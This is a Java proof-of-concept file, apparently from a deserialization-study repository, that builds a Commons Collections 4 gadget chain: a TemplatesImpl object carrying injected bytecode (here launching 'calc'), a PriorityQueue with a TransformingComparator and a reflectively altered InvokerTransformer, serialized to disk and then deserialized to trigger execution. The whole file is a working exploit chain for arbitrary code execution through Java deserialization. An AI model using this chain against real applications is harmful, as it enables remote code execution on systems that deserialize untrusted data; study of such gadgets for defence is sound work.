package Seri;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InvokerTransformer;

import java.util.Comparator;
import java.util.PriorityQueue;

public class CC4CCGadgets2 {
    public static void main(String[] args) throws Exception {
        byte[] bytes = Utils.getEvilPayload("calc");
        TemplatesImpl templates = new TemplatesImpl();
        Utils.setValue(templates ,"_name" ,"xxx");
        Utils.setValue(templates ,"_class" ,null);
        Utils.setValue(templates ,"_bytecodes" ,new byte[][]{bytes});
        Utils.setValue(templates ,"_tfactory" ,new TransformerFactoryImpl());

        Transformer[] fakeTransformers = new Transformer[] {new ConstantTransformer(1)};

        Transformer transformer = new InvokerTransformer("toString" ,null ,null);

        Comparator comparator = new TransformingComparator(transformer);
        PriorityQueue queue = new PriorityQueue(comparator);

        queue.add(templates);
        queue.add(templates);


        Utils.setValue(transformer ,"iMethodName" ,"newTransformer");

        System.out.println(Utils.serialize(queue ,"bin/CC4CCGadgets2.bin"));
        Utils.unserialize("bin/CC4CCGadgets2.bin");
    }
}
